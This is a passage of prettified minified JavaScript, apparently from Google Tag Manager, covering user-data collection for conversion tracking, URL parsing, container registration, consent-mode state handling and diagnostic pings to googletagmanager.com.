                for (var p = 0; p < n.length; p++) f = f && f[n[p]];
              }
              if (void 0 !== f) break;
            }
          }
        else if ("css_selector" === d && nh)
          try {
            var q = mh(e);
            if (q && q.length > 0) {
              f = [];
              for (
                var r = 0;
                r < q.length &&
                r < ("email" === b || "phone_number" === b ? 5 : 1);
                r++
              )
                f.push(Hc(q[r]) || Ab(q[r].value));
              f = 1 === f.length ? f[0] : f;
            }
          } catch (t) {
            O(149);
          }
        return !!f && ((a[b] = f), !0);
      },
      Ni = function (a) {
        if (a) {
          var b = {},
            c = !1;
          (c = Mi(b, "email", a.email) || c),
            (c = Mi(b, "phone_number", a.phone) || c),
            (b.address = []);
          for (var d = a.name_and_address || [], e = 0; e < d.length; e++) {
            var f = {};
            (c = Mi(f, "first_name", d[e].first_name) || c),
              (c = Mi(f, "last_name", d[e].last_name) || c),
              (c = Mi(f, "street", d[e].street) || c),
              (c = Mi(f, "city", d[e].city) || c),
              (c = Mi(f, "region", d[e].region) || c),
              (c = Mi(f, "country", d[e].country) || c),
              (c = Mi(f, "postal_code", d[e].postal_code) || c),
              b.address.push(f);
          }
          return c ? b : void 0;
        }
      },
      Pi = /:[0-9]+$/,
      Qi = /^\d+\.fls\.doubleclick\.net$/;
    function Ri(a, b, c, d) {
      for (
        var e = [], f = ma(a.split("&")), g = f.next();
        !g.done;
        g = f.next()
      ) {
        var k = ma(g.value.split("=")),
          m = k.next().value,
          n = oa(k);
        if (decodeURIComponent(m.replace(/\+/g, " ")) === b) {
          var p = n.join("=");
          if (!c) return d ? p : decodeURIComponent(p.replace(/\+/g, " "));
          e.push(d ? p : decodeURIComponent(p.replace(/\+/g, " ")));
        }
      }
      return c ? e : void 0;
    }
    function Si(a, b, c, d, e) {
      return (
        b && (b = String(b).toLowerCase()),
        ("protocol" !== b && "port" !== b) ||
          (a.protocol = Ti(a.protocol) || Ti(G.location.protocol)),
        "port" === b
          ? (a.port = String(
              Number(a.hostname ? a.port : G.location.port) ||
                ("http" === a.protocol ? 80 : "https" === a.protocol ? 443 : "")
            ))
          : "host" === b &&
            (a.hostname = (a.hostname || G.location.hostname)
              .replace(Pi, "")
              .toLowerCase()),
        Ui(a, b, c, d, e)
      );
    }
    function Ui(a, b, c, d, e) {
      var f,
        g = Ti(a.protocol);
      switch ((b && (b = String(b).toLowerCase()), b)) {
        case "url_no_fragment":
          f = Vi(a);
          break;
        case "protocol":
          f = g;
          break;
        case "host":
          if (((f = a.hostname.replace(Pi, "").toLowerCase()), c)) {
            var k = /^www\d*\./.exec(f);
            k && k[0] && (f = f.substring(k[0].length));
          }
          break;
        case "port":
          f = String(
            Number(a.port) || ("http" === g ? 80 : "https" === g ? 443 : "")
          );
          break;
        case "path":
          a.pathname || a.hostname || ib("TAGGING", 1);
          var m = (f =
            "/" === a.pathname.substring(0, 1)
              ? a.pathname
              : "/" + a.pathname).split("/");
          (d || []).indexOf(m[m.length - 1]) >= 0 && (m[m.length - 1] = ""),
            (f = m.join("/"));
          break;
        case "query":
          (f = a.search.replace("?", "")), e && (f = Ri(f, e, !1));
          break;
        case "extension":
          var n = a.pathname.split(".");
          f = (f = n.length > 1 ? n[n.length - 1] : "").split("/")[0];
          break;
        case "fragment":
          f = a.hash.replace("#", "");
          break;
        default:
          f = a && a.href;
      }
      return f;
    }
    function Ti(a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    }
    function Vi(a) {
      var b = "";
      if (a && a.href) {
        var c = a.href.indexOf("#");
        b = c < 0 ? a.href : a.href.substring(0, c);
      }
      return b;
    }
    var Wi = {},
      Xi = 0;
    function Yi(a) {
      var b = Wi[a];
      if (!b) {
        var c = H.createElement("a");
        a && (c.href = a);
        var d = c.pathname;
        "/" !== d[0] && (a || ib("TAGGING", 1), (d = "/" + d));
        var e = c.hostname.replace(Pi, "");
        (b = {
          href: c.href,
          protocol: c.protocol,
          host: c.host,
          hostname: e,
          pathname: d,
          search: c.search,
          hash: c.hash,
          port: c.port,
        }),
          Xi < 5 && ((Wi[a] = b), Xi++);
      }
      return b;
    }
    function $i(a) {
      var b = Yi(G.location.href),
        c = Si(b, "host", !1);
      if (c && c.match(Qi)) {
        var d = Si(b, "path");
        if (d) {
          var e = d.split(a + "=");
          if (e.length > 1) return e[1].split(";")[0].split("?")[0];
        }
      }
    }
    var aj = {
      "https://www.google.com": "/g",
      "https://www.googleadservices.com": "/as",
      "https://pagead2.googlesyndication.com": "/gs",
    };
    function cj(a, b) {
      if (zi.D || oi)
        return (function bj(a, b) {
          if (a) {
            var c = "" + a;
            return (
              0 !== c.indexOf("http://") &&
                0 !== c.indexOf("https://") &&
                (c = "https://" + c),
              "/" === c[c.length - 1] && (c = c.substring(0, c.length - 1)),
              Yi("" + c + b).href
            );
          }
        })(a, b);
    }
    function dj() {
      return !!gi.Jf && "SGTM_TOKEN" !== gi.Jf.split("@@").join("");
    }
    function fj(a, b) {
      return zi.D ? "" + Ai() + ((b && aj[a]) || "") : a;
    }
    var kj,
      hj =
        G.location.search.indexOf("?gtm_latency=") >= 0 ||
        G.location.search.indexOf("&gtm_latency=") >= 0,
      ij_sampleRate = "0.005000",
      ij_pn = "0.005",
      jj = Math.random();
    (kj = hj) || (kj = jj < Number(ij_sampleRate));
    var mj = kj,
      nj =
        (null == tc ? void 0 : tc.includes("gtm_debug=d")) ||
        hj ||
        jj >= 1 - Number(ij_pn),
      oj = /gtag[.\/]js/,
      pj = /gtm[.\/]js/,
      qj = !1;
    function sj(a, b) {
      var c = tj();
      c.pending || (c.pending = []),
        sb(c.pending, function (d) {
          return (
            d.target.ctid === a.ctid &&
            d.target.isDestination === a.isDestination
          );
        }) || c.pending.push({ target: a, onLoad: b });
    }
    var uj = function () {
      var a;
      (this.container = {}),
        (this.destination = {}),
        (this.canonical = {}),
        (this.pending = []),
        (this.siloed = []),
        (this.injectedFirstPartyContainers = {});
      var b = G.google_tags_first_party || [];
      if (Array.isArray(b)) {
        for (var c = {}, d = ma(b), e = d.next(); !e.done; e = d.next())
          c[e.value] = !0;
        a = Object.freeze(c);
      } else a = {};
      this.injectedFirstPartyContainers = a;
    };
    function tj() {
      var a = uc("google_tag_data", {}),
        b = a.tidr;
      return b || ((b = new uj()), (a.tidr = b)), b;
    }
    var vj = {},
      wj = !1,
      Qf = {
        ctid: "GTM-5QFXCMC",
        canonicalContainerId: "6985533",
        bk: "GTM-5QFXCMC",
        dk: "GTM-5QFXCMC",
      };
    function xj() {
      var a = yj();
      return wj ? a.map(zj) : a;
    }
    function Aj() {
      var a = Bj();
      return wj ? a.map(zj) : a;
    }
    function Cj() {
      return Dj(Qf.ctid);
    }
    function Ej() {
      return Dj(Qf.canonicalContainerId || "_" + Qf.ctid);
    }
    function yj() {
      return Qf.bk ? Qf.bk.split("|") : [Qf.ctid];
    }
    function Bj() {
      return Qf.dk ? Qf.dk.split("|") : [];
    }
    function Fj() {
      var a = Gj(Hj()),
        b = a && a.parent;
      if (b) return Gj(b);
    }
    function Gj(a) {
      var b = tj();
      return a.isDestination ? b.destination[a.ctid] : b.container[a.ctid];
    }
    function Dj(a) {
      return wj ? zj(a) : a;
    }
    function zj(a) {
      return "siloed_" + a;
    }
    function Ij(a) {
      return wj ? Jj(a) : a;
    }
    function Jj(a) {
      return Hb((a = String(a)), "siloed_") ? a.substring(7) : a;
    }
    function Pj() {
      for (
        var a = Qf.ctid,
          b = xj(),
          c = Aj(),
          d = function (n, p) {
            var q = {
              canonicalContainerId: Qf.canonicalContainerId,
              scriptContainerId: a,
              state: 2,
              containers: b.slice(),
              destinations: c.slice(),
            };
            if (
              (sc && (q.scriptElement = sc),
              tc && (q.scriptSource = tc),
              void 0 === Fj())
            ) {
              var r;
              a: {
                if ((q.scriptContainerId || "").indexOf("GTM-") >= 0) {
                  var t;
                  b: {
                    if (q.scriptSource) {
                      for (
                        var u = zi.H,
                          v = Yi(q.scriptSource),
                          w = u ? v.pathname : "" + v.hostname + v.pathname,
                          x = H.scripts,
                          y = "",
                          B = 0;
                        B < x.length;
                        ++B
                      ) {
                        var A = x[B];
                        if (
                          !(
                            0 === A.innerHTML.length ||
                            (!u &&
                              A.innerHTML.indexOf(
                                q.scriptContainerId || "SHOULD_NOT_BE_SET"
                              ) < 0) ||
                            A.innerHTML.indexOf(w) < 0
                          )
                        ) {
                          if (
                            A.innerHTML.indexOf("(function(w,d,s,l,i)") >= 0
                          ) {
                            t = String(B);
                            break b;
                          }
                          y = String(B);
                        }
                      }
                      if (y) {
                        t = y;
                        break b;
                      }
                    }
                    t = void 0;
                  }
                  if (t) {
                    (qj = !0), (r = t);
                    break a;
                  }
                }
                var E = [].slice.call(document.scripts);
                r = q.scriptElement ? String(E.indexOf(q.scriptElement)) : "-1";
              }
              (q.htmlLoadOrder = r),
                (q.loadScriptType = (function rj(a) {
                  if (qj) return "1";
                  var b = a.scriptSource;
                  if (b) {
                    if (oj.test(b)) return "3";
                    if (pj.test(b)) return "2";
                  }
                  return "0";
                })(q));
            }
            var D = p ? e.destination : e.container,
              F = D[n];
            F ? (p && 0 === F.state && O(93), Object.assign(F, q)) : (D[n] = q);
          },
          e = tj(),
          f = ma(b),
          g = f.next();
        !g.done;
        g = f.next()
      )
        d(g.value, !1);
      for (var k = ma(c), m = k.next(); !m.done; m = k.next()) d(m.value, !0);
      (e.canonical[Ej()] = {}),
        (function Oj() {
          var a = tj();
          if (a.pending) {
            for (
              var b, c = [], d = !1, e = xj(), f = Aj(), g = {}, k = 0;
              k < a.pending.length;
              g = { Se: void 0 }, k++
            )
              (g.Se = a.pending[k]),
                sb(
                  g.Se.target.isDestination ? f : e,
                  (function (m) {
                    return function (n) {
                      return n === m.Se.target.ctid;
                    };
                  })(g)
                )
                  ? d || ((b = g.Se.onLoad), (d = !0))
                  : c.push(g.Se);
            if (((a.pending = c), b))
              try {
                b(Ej());
              } catch (m) {}
          }
        })();
    }
    function Hj() {
      return { ctid: Cj(), isDestination: vj.oe };
    }
    function Sj(a) {
      var b = tj();
      (b.siloed = b.siloed || []).push(a);
    }
    function Tj() {
      var b,
        a = tj().container;
      for (b in a) if (a.hasOwnProperty(b) && 1 === a[b].state) return !0;
      return !1;
    }
    vj.oe = yb("");
    var Wj = "/td?id=" + Qf.ctid,
      Xj = ["v", "t", "pid", "dl", "tdp"],
      Yj = ["mcc"],
      Zj = {},
      ak = {};
    function bk(a, b, c) {
      (ak[a] = b), (void 0 === c || c) && ck(a);
    }
    function ck(a, b) {
      (void 0 === Zj[a] || (void 0 !== b && b)) && (Zj[a] = !0);
    }
    function fk(a) {
      if (((a = void 0 !== a && a), nj && Qf.ctid)) {
        var b = (function dk(a) {
          a = void 0 !== a && a;
          var b = Object.keys(Zj)
            .filter(function (c) {
              return !0 === Zj[c] && void 0 !== ak[c] && (a || !Yj.includes(c));
            })
            .map(function (c) {
              var d = ak[c];
              return (
                "function" == typeof d && (d = d()), d ? "&" + c + "=" + d : ""
              );
            })
            .join("");
          return "" + fj("https://www.googletagmanager.com") + Wj + b + "&z=0";
        })(a);
        a ? Oc(b) : Dc(b),
          (function ek() {
            Object.keys(Zj).forEach(function (a) {
              Xj.indexOf(a) < 0 && (Zj[a] = !1);
            });
          })();
      }
    }
    function gk() {
      Object.keys(Zj).filter(function (a) {
        return Zj[a] && !Xj.includes(a);
      }).length > 0 && fk(!0);
    }
    var hk = tb();
    function ik() {
      hk = tb();
    }
    function kk(a, b) {
      if ("" === a) return b;
      var c = Number(a);
      return isNaN(c) ? b : c;
    }
    var lk = [];
    function T(a) {
      lk[a] = !0;
      var b = (function mk(a) {
        switch (a) {
          case 0:
            return 0;
          case 42:
            return 1;
          case 43:
            return 2;
          case 44:
            return 11;
          case 49:
            return 3;
          case 57:
            return 4;
          case 65:
            return 7;
          case 75:
            return 5;
          case 84:
            return 6;
          case 85:
            return 10;
          case 87:
            return 8;
          case 88:
            return 9;
        }
      })(a);
      void 0 !== b && (lb[b] = !0);
    }
    function U(a) {
      return !!lk[a];
    }
    T(30),
      T(26),
      T(27),
      T(28),
      T(29),
      T(45),
      T(69),
      T(53),
      T(66),
      T(33),
      T(15),
      T(93),
      T(14),
      T(98),
      T(92),
      T(58),
      T(76),
      T(6),
      T(46),
      T(4),
      T(73),
      T(89),
      T(64),
      T(62),
      T(74),
      T(102),
      T(99),
      T(75),
      T(5),
      T(17),
      T(18),
      T(84),
      (mb[1] = kk("1", 6e4)),
      (mb[3] = kk("10", 1)),
      (mb[2] = kk("", 50)),
      T(23),
      T(11),
      T(61),
      T(90),
      T(72),
      T(50),
      T(22),
      T(101),
      T(41),
      T(77),
      T(85),
      T(79),
      T(47),
      T(59);
    var qk = new (function (a, b) {
      (this.j = 1933), (this.defaultValue = !1);
    })(1933);
    function rk() {
      var a = uc("google_tag_data", {});
      return (a.ics = a.ics || new sk());
    }
    var sk = function () {
      (this.entries = {}),
        (this.waitPeriodTimedOut =
          this.wasSetLate =
          this.accessedAny =
          this.accessedDefault =
          this.usedImplicit =
          this.usedUpdate =
          this.usedDefault =
          this.usedDeclare =
          this.active =
            !1),
        (this.j = []);
    };
    (sk.prototype.default = function (a, b, c, d, e, f, g) {
      this.usedDefault ||
        this.usedDeclare ||
        (!this.accessedDefault && !this.accessedAny) ||
        (this.wasSetLate = !0),
        (this.usedDefault = this.active = !0),
        ib("TAGGING", 19),
        null == b
          ? ib("TAGGING", 18)
          : tk(this, a, "granted" === b, c, d, e, f, g);
    }),
      (sk.prototype.waitForUpdate = function (a, b, c) {
        for (var d = 0; d < a.length; d++)
          tk(this, a[d], void 0, void 0, "", "", b, c);
      });
    var tk = function (a, b, c, d, e, f, g, k) {
      var m = a.entries,
        n = m[b] || {},
        p = n.region,
        q = d && l(d) ? d.toUpperCase() : void 0;
      if (
        ((e = e.toUpperCase()),
        (f = f.toUpperCase()),
        "" === e || q === f || (q === e ? p !== f : !q && !p))
      ) {
        var r = !!(g && g > 0 && void 0 === n.update),
          t = {
            region: q,
            declare_region: n.declare_region,
            implicit: n.implicit,
            default: void 0 !== c ? c : n.default,
            declare: n.declare,
            update: n.update,
            quiet: r,
          };
        ("" === e && !1 === n.default) || (m[b] = t),
          r &&
            G.setTimeout(function () {
              m[b] === t &&
                t.quiet &&
                (ib("TAGGING", 2),
                (a.waitPeriodTimedOut = !0),
                a.clearTimeout(b, void 0, k),
                a.notifyListeners());
            }, g);
      }
    };
    ((ba = sk.prototype).clearTimeout = function (a, b, c) {
      var f,
        d = [a],
        e = c.delegatedConsentTypes;
      for (f in e) e.hasOwnProperty(f) && e[f] === a && d.push(f);
      var g = this.entries[a] || {},
        k = this.getConsentState(a, c);
      if (g.quiet) {
        g.quiet = !1;
        for (var m = ma(d), n = m.next(); !n.done; n = m.next())
          uk(this, n.value);
      } else if (void 0 !== b && k !== b)
        for (var p = ma(d), q = p.next(); !q.done; q = p.next())
          uk(this, q.value);
    }),
      (ba.update = function (a, b, c) {
        if (
          (this.usedDefault ||
            this.usedDeclare ||
            this.usedUpdate ||
            !this.accessedAny ||
            (this.wasSetLate = !0),
          (this.usedUpdate = this.active = !0),
          null != b)
        ) {
          var d = this.getConsentState(a, c),
            e = this.entries;
          ((e[a] = e[a] || {}).update = "granted" === b),
            this.clearTimeout(a, d, c);
        }
      }),
      (ba.declare = function (a, b, c, d, e) {
        this.usedDeclare = this.active = !0;
        var f = this.entries,
          g = f[a] || {},
          k = g.declare_region,
          m = c && l(c) ? c.toUpperCase() : void 0;
        if (
          ((d = d.toUpperCase()),
          (e = e.toUpperCase()),
          "" === d || m === e || (m === d ? k !== e : !m && !k))
        ) {
          var n = {
            region: g.region,
            declare_region: m,
            declare: "granted" === b,
            implicit: g.implicit,
            default: g.default,
            update: g.update,
            quiet: g.quiet,
          };
          ("" === d && !1 === g.declare) || (f[a] = n);
        }
      }),
      (ba.implicit = function (a, b) {
        this.usedImplicit = !0;
        var c = this.entries,
          d = (c[a] = c[a] || {});
        !1 !== d.implicit && (d.implicit = "granted" === b);
      }),
      (ba.getConsentState = function (a, b) {
        var c = this.entries,
          d = c[a] || {},
          e = d.update;
        if (void 0 !== e) return e ? 1 : 2;
        if (nb(8) && b.usedContainerScopedDefaults) {
          var f = b.containerScopedDefaults[a];
          if (3 === f) return 1;
          if (2 === f) return 2;
        } else if (void 0 !== (e = d.default)) return e ? 1 : 2;
        if (null != b && b.delegatedConsentTypes.hasOwnProperty(a)) {
          var g = b.delegatedConsentTypes[a],
            k = c[g] || {};
          if (void 0 !== (e = k.update)) return e ? 1 : 2;
          if (nb(8) && b.usedContainerScopedDefaults) {
            var m = b.containerScopedDefaults[g];
            if (3 === m) return 1;
            if (2 === m) return 2;
          } else if (void 0 !== (e = k.default)) return e ? 1 : 2;
        }
        return void 0 !== (e = d.declare)
          ? e
            ? 1
            : 2
          : void 0 !== (e = d.implicit)
          ? e
            ? 3
            : 4
          : 0;
      }),
      (ba.addListener = function (a, b) {
        this.j.push({ consentTypes: a, Jl: b });
      });
    var uk = function (a, b) {
      for (var c = 0; c < a.j.length; ++c) {
        var d = a.j[c];
        Array.isArray(d.consentTypes) &&
          -1 !== d.consentTypes.indexOf(b) &&
          (d.ek = !0);
      }
    };
    sk.prototype.notifyListeners = function (a, b) {
      for (var c = 0; c < this.j.length; ++c) {
        var d = this.j[c];
        if (d.ek) {
          d.ek = !1;
          try {
            d.Jl({ consentEventId: a, consentPriorityId: b });
          } catch (e) {}
        }
      }
    };
    var vk = function (a) {
      return vk[" "](a), a;
    };
    vk[" "] = function () {};
    var xk = function () {
        var a = wk;
        if (a.zh && a.hasOwnProperty("zh")) return a.zh;
        var c = new a();
        return (a.zh = c);
      },
      wk = function () {
        var a = {};
        (this.j = function () {
          var b = qk.j,
            c = qk.defaultValue;
          return null != a[b] ? a[b] : c;
        }),
          (this.D = function () {
            a[qk.j] = !0;
          });
      },
      yk = !1,
      zk = !1,
      Ak = {},
      Bk = {
        delegatedConsentTypes: {},
        corePlatformServices: {},
        usedCorePlatformServices: !1,
        selectedAllCorePlatformServices: !1,
        containerScopedDefaults:
          ((Ak.ad_storage = 1),
          (Ak.analytics_storage = 1),
          (Ak.ad_user_data = 1),
          (Ak.ad_personalization = 1),
          Ak),
        usedContainerScopedDefaults: !1,
      };
    function Ck(a) {
      var b = rk();
      return (
        (b.accessedAny = !0),
        (l(a) ? [a] : a).every(function (c) {
          switch (b.getConsentState(c, Bk)) {
            case 1:
            case 3:
            default:
              return !0;
            case 2:
            case 4:
              return !1;
          }
        })
      );
    }
    function Dk(a) {
      var b = rk();
      return (b.accessedAny = !0), b.getConsentState(a, Bk);
    }
    function Fk(a) {
      var b = rk();
      return (b.accessedAny = !0), !(b.entries[a] || {}).quiet;
    }
    function Gk() {
      if (!xk().j()) return !1;
      var a = rk();
      if (((a.accessedAny = !0), a.active)) return !0;
      if (!nb(8) || !Bk.usedContainerScopedDefaults) return !1;
      for (
        var b = ma(Object.keys(Bk.containerScopedDefaults)), c = b.next();
        !c.done;
        c = b.next()
      )
        if (1 !== Bk.containerScopedDefaults[c.value]) return !0;
      return !1;
    }
    function Hk(a, b) {
      rk().addListener(a, b);
    }
    function Ik(a, b) {
      rk().notifyListeners(a, b);
    }
    function Jk(a, b) {
      function c() {
        for (var e = 0; e < b.length; e++) if (!Fk(b[e])) return !0;
        return !1;
      }
      if (c()) {
        var d = !1;
        Hk(b, function (e) {
          d || c() || ((d = !0), a(e));
        });
      } else a({});
    }
    function Kk(a, b) {
      function c() {
        for (var k = [], m = 0; m < e.length; m++) {
          var n = e[m];
          Ck(n) && !f[n] && k.push(n);
        }
        return k;
      }
      function d(k) {
        for (var m = 0; m < k.length; m++) f[k[m]] = !0;
      }
      var e = l(b) ? [b] : b,
        f = {},
        g = c();
      g.length !== e.length &&
        (d(g),
        Hk(e, function (k) {
          function m(q) {
            0 !== q.length && (d(q), (k.consentTypes = q), a(k));
          }
          var n = c();
          if (0 !== n.length) {
            var p = Object.keys(f).length;
            n.length + p >= e.length
              ? m(n)
              : G.setTimeout(function () {
                  m(c());
                }, 500);
          }
        }));
    }
    var Rk,
      Lk = [
        "ad_storage",
        "analytics_storage",
        "ad_user_data",
        "ad_personalization",
      ],
      Mk = !1,
      Nk = !1;
    function Ok() {
      U(47) &&
        !Nk &&
        Mk &&
        (Lk.some(function (a) {
          return 1 !== Bk.containerScopedDefaults[a];
        }) ||
          Pk("mbc")),
        (Nk = !0);
    }
    function Pk(a) {
      nj && (bk(a, "1"), fk());
    }
    function Qk(a) {
      ib("HEALTH", a);
    }
    try {
      Rk = JSON.parse(
        gb(
          "eyIwIjoiR0IiLCIxIjoiIiwiMiI6ZmFsc2UsIjMiOiJnb29nbGUuY28udWsiLCI0IjoicmVnaW9uMSIsIjUiOmZhbHNlLCI2IjpmYWxzZSwiNyI6ImFkX3N0b3JhZ2V8YW5hbHl0aWNzX3N0b3JhZ2V8YWRfdXNlcl9kYXRhfGFkX3BlcnNvbmFsaXphdGlvbiJ9"
        )
      );
    } catch (a) {
      O(123), Qk(2), (Rk = {});
    }
    function Sk() {
      return Rk[0] || "";
    }
    function Tk() {
      return Rk[1] || "";
    }
    function Vk() {
      return !1 !== Rk[6];
    }
    function Xk() {
      return !!Rk[5];
    }
    var $k,
      al,
      Zk = [P.g.R, P.g.U, P.g.O, P.g.ya];
    function el(a, b) {
      Ok(),
        ($k = !0),
        z(a, function (c, d) {
          (yk = !0), zk && ib("TAGGING", 20), rk().update(c, d, Bk);
        }),
        Ik(b.eventId, b.priorityId);
    }
    function W(a) {
      return (
        Array.isArray(a) || (a = [a]),
        a.every(function (b) {
          return Ck(b);
        })
      );
    }
    function hl(a, b) {
      Kk(a, b);
    }
    function il(a, b) {
      Jk(a, b);
    }
    function kl(a) {
      for (var b = ma(a), c = b.next(); !c.done; c = b.next()) {
        var d = c.value;
        rk().clearTimeout(d, void 0, Bk);
      }
      Ik();
    }
    var nl = /[A-Z]+/,
      ol = /\s/;
    function pl(a, b) {
      if (l(a)) {
        var c = (a = Ab(a)).indexOf("-");
        if (!(c < 0)) {
          var d = a.substring(0, c);
          if (nl.test(d)) {
            var f,
              e = a.substring(c + 1);
            if (b) {
              var g = function (n) {
                var p = n.indexOf("/");
                return p < 0 ? [n] : [n.substring(0, p), n.substring(p + 1)];
              };
              if (((f = g(e)), "DC" === d && 2 === f.length)) {
                var k = g(f[1]);
                2 === k.length && ((f[1] = k[0]), f.push(k[1]));
              }
            } else {
              f = e.split("/");
              for (var m = 0; m < f.length; m++)
                if (!f[m] || (ol.test(f[m]) && ("AW" !== d || 1 !== m))) return;
            }
            return { id: a, prefix: d, ia: d + "-" + f[0], ma: f };
          }
        }
      }
    }
    function ql(a, b) {
      for (var c = {}, d = 0; d < a.length; ++d) {
        var e = pl(a[d], b);
        e && (c[e.id] = e);
      }
      !(function rl(a) {
        var c,
          b = [];
        for (c in a)
          if (a.hasOwnProperty(c)) {
            var d = a[c];
            "AW" === d.prefix && d.ma[sl[2]] && b.push(d.ia);
          }
        for (var e = 0; e < b.length; ++e) delete a[b[e]];
      })(c);
      var f = [];
      return (
        z(c, function (g, k) {
          f.push(k);
        }),
        f
      );
    }
    var tl = {},
      sl =
        ((tl[0] = 0),
        (tl[1] = 0),
        (tl[2] = 1),
        (tl[3] = 0),
        (tl[4] = 1),
        (tl[5] = 2),
        (tl[6] = 0),
        (tl[7] = 0),
        (tl[8] = 0),
        tl),
      ul = Number("") || 500,
      vl = {},
      wl = {},
      xl = { initialized: 11, complete: 12, interactive: 13 },
      yl = {},
      zl = Object.freeze(((yl[P.g.Ja] = !0), yl)),
      Al =
        H.location.search.indexOf("?gtm_diagnostics=") >= 0 ||
        H.location.search.indexOf("&gtm_diagnostics=") >= 0,
      Bl = void 0;
    function Dl(a, b, c) {
      if (nj && "config" === a) {
        var d,
          e = null == (d = pl(b)) ? void 0 : d.ma;
        if (!(e && e.length > 1)) {
          var f,
            g = uc("google_tag_data", {});
          g.td || (g.td = {}), (f = g.td);
          var k = h(c.K);
          h(c.j, k);
          var n,
            m = [];
          for (n in f)
            if (f.hasOwnProperty(n)) {
              var p = El(f[n], k);
              p.length && (Al && console.log(p), m.push(n));
            }
          m.length &&
            ((function Cl(a, b) {
              if (b.length && nj) {
                var c;
                null != (c = vl)[a] || (c[a] = []),
                  null != wl[a] || (wl[a] = []);
                var d = b.filter(function (e) {
                  return !wl[a].includes(e);
                });
                vl[a].push.apply(vl[a], pa(d)),
                  wl[a].push.apply(wl[a], pa(d)),
                  !Bl &&
                    d.length > 0 &&
                    (ck("tdc", !0),
                    (Bl = G.setTimeout(function () {
                      fk(), (vl = {}), (Bl = void 0);
                    }, ul)));
              }
            })(b, m),
            ib("TAGGING", xl[H.readyState] || 14)),
            (f[b] = k);
        }
      }
    }
    function El(a, b, c, d) {
      if (((c = void 0 === c ? {} : c), (d = void 0 === d ? "" : d), a === b))
        return [];
      var g,
        e = function (r, t) {
          var u;
          return (
            ("object" === Qa(t) || "array" === Qa(t)) && (u = t[r]),
            void 0 === u ? zl[r] : u
          );
        },
        f = (function Fl(a, b) {
          var d,
            c = {};
          for (d in b) b.hasOwnProperty(d) && (c[d] = !0);
          for (var e in a) a.hasOwnProperty(e) && (c[e] = !0);
          return c;
        })(a, b);
      for (g in f)
        if (f.hasOwnProperty(g)) {
          var k = (d ? d + "." : "") + g,
            m = e(g, a),
            n = e(g, b),
            p = "object" === Qa(m) || "array" === Qa(m),
            q = "object" === Qa(n) || "array" === Qa(n);
          p && q ? El(m, n, c, k) : (p || q || m !== n) && (c[k] = !0);
        }
      return Object.keys(c);
    }
    var Hl = function (a, b, c, d, e, f, g, k, m, n, p) {
        (this.eventId = a),
          (this.priorityId = b),
          (this.j = c),
          (this.P = d),
          (this.H = e),
          (this.K = f),
          (this.D = g),
          (this.eventMetadata = k),
          (this.onSuccess = m),
          (this.onFailure = n),
          (this.isGtmEvent = p);
      },
      Il = function (a, b) {
        var c = [];
        switch (b) {
          case 3:
            c.push(a.j), c.push(a.P), c.push(a.H), c.push(a.K), c.push(a.D);
            break;
          case 2:
            c.push(a.j);
            break;
          case 1:
            c.push(a.P), c.push(a.H), c.push(a.K), c.push(a.D);
            break;
          case 4:
            c.push(a.j), c.push(a.P), c.push(a.H), c.push(a.K);
        }
        return c;
      },
      Q = function (a, b, c, d) {
        for (
          var e = ma(Il(a, void 0 === d ? 3 : d)), f = e.next();
          !f.done;
          f = e.next()
        ) {
          var g = f.value;
          if (void 0 !== g[b]) return g[b];
        }
        return c;
      },
      Kl = function (a, b, c) {
        var n,
          e = {},
          f = !1,
          g = Il(a, void 0 === c ? 3 : c);
        g.reverse();
        for (var k = ma(g), m = k.next(); !m.done; m = k.next())
          (n = m.value[b]),
            Ta(n) &&
              z(n, function (p, q) {
                (f = !0), (e[p] = q);
              });
        return f ? e : void 0;
      },
      Ml = function (a, b) {
        (this.eventId = a),
          (this.priorityId = b),
          (this.D = {}),
          (this.P = {}),
          (this.j = {}),
          (this.H = {}),
          (this.Z = {}),
          (this.K = {}),
          (this.eventMetadata = {}),
          (this.isGtmEvent = !1),
          (this.onSuccess = function () {}),
          (this.onFailure = function () {});
      },
      Nl = function (a, b) {
        return (a.D = b), a;
      },
      Ul = function (a, b) {
        return (a.onSuccess = b), a;
      },
      Vl = function (a, b) {
        return (a.onFailure = b), a;
      },
      Wl = function (a, b) {
        return (a.isGtmEvent = b), a;
      },
      Xl = function (a) {
        return new Hl(
          a.eventId,
          a.priorityId,
          a.D,
          a.P,
          a.j,
          a.H,
          a.K,
          a.eventMetadata,
          a.onSuccess,
          a.onFailure,
          a.isGtmEvent
        );
      },
      Yl = { uk: Number("5"), Yn: Number("") },
      Zl = [];
    function $l(a) {
      Zl.push(a);
    }
    var am = "?id=" + Qf.ctid,
      bm = void 0,
      cm = {},
      dm = void 0,
      em = new (function () {
        var a = 5;
        Yl.uk > 0 && (a = Yl.uk), (this.D = a), (this.j = 0), (this.H = []);
      })(),
      fm = 1e3;
    function gm(a, b) {
      var c = bm;
      if (void 0 === c) {
        if (!b) return "";
        c = xi();
      }
      for (
        var d = [fj("https://www.googletagmanager.com"), "/a", am],
          e = ma(Zl),
          f = e.next();
        !f.done;
        f = e.next()
      )
        for (
          var k = (0, f.value)({ eventId: c, mc: !!a }),
            m = ma(k),
            n = m.next();
          !n.done;
          n = m.next()
        ) {
          var p = ma(n.value),
            q = p.next().value,
            r = p.next().value;
          d.push("&" + q + "=" + r);
        }
      return d.push("&z=0"), d.join("");
    }
    function hm() {
      var a;
      if ((dm && (G.clearTimeout(dm), (dm = void 0)), void 0 !== bm && im))
        if (
          ((a = cm[bm]) ||
            (a = !(em.j < em.D) && Cb() - em.H[em.j % em.D] < 1e3),
          a || fm-- <= 0)
        )
          O(1), (cm[bm] = !0);
        else {
          var b = em.j++ % em.D;
          em.H[b] = Cb();
          var c = gm(!0);
          Dc(c), (im = !1);
        }
    }
    var im = !1;
    function jm(a) {
      cm[a] ||
        (a !== bm && (hm(), (bm = a)),
        (im = !0),
        dm || (dm = G.setTimeout(hm, 500)),
        gm().length >= 2022 && hm());
    }
    var km = tb();
    function lm() {
      km = tb();
    }
    function mm() {
      return [
        ["v", "3"],
        ["t", "t"],
        ["pid", String(km)],
      ];
    }
    var nm = {};
    function om(a, b, c) {
      mj && void 0 !== a && ((nm[a] = nm[a] || []), nm[a].push(c + b), jm(a));
    }
    function pm(a) {
      var b = a.eventId,
        c = a.mc,
        d = [],
        e = nm[b] || [];
      return e.length && d.push(["epr", e.join(".")]), c && delete nm[b], d;
    }
    function sm(a, b, c, d) {
      var e = pl(c, d.isGtmEvent);
      e && rm.push("event", [b, a], e, d);
    }
    var xm = function () {
        (this.P = {}),
          (this.j = {}),
          (this.D = {}),
          (this.Z = null),
          (this.K = {}),
